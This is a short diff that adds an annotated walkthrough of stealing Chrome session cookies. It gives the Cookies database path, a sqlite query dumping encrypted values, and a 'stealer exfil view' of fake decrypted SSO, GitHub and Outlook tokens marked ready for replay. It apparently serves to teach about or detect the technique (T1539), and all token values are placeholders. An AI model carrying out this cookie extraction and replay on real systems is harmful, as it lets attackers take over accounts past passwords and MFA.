@@ -1,0 +1,17 @@
+# "Cookies" is a SQLite DB:
+#   C:\Users\mwong\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies
+# encrypted_value uses the SAME key as Login Data. Session/auth cookies let an
+# attacker replay a logged-in session WITHOUT the password (T1539) — including
+# past MFA.
+
+sqlite> SELECT host_key, name, hex(encrypted_value), is_secure, is_httponly FROM cookies;
+host_key|name|encrypted_value(hex)|secure|httponly
+.fabrikam.com|SSO_SESSION|763131 5E6F708192A3 B4C5D6E7F8091223 FAKEGCMct|1|1
+.google.com|SID|763130 6F70819293A4 B5C6D7E8F9012233 FAKEGCMct|1|0
+.github.com|user_session|763131 708192A3B4C5 D6E7F80912233c4d FAKEGCMct|1|1
+mail.fabrikam.com|OWA-AuthToken|763131 8192A3B4C5D6 E7F80912233c4d5e FAKEGCMct|1|1
+
+# ---- decrypted (stealer exfil view — ready for cookie-replay) ----
+.fabrikam.com   SSO_SESSION   eyJhbGciOiJIUzI1NiJ9.FAKEssoSessionJwtPayload.FAKEsig0123456789
+.github.com     user_session  fake_github_user_session_0123456789abcdefghijklmno
+mail.fabrikam.com  OWA-AuthToken  FAKE-owa-auth-cookie-abcdef0123456789ghijklmnop
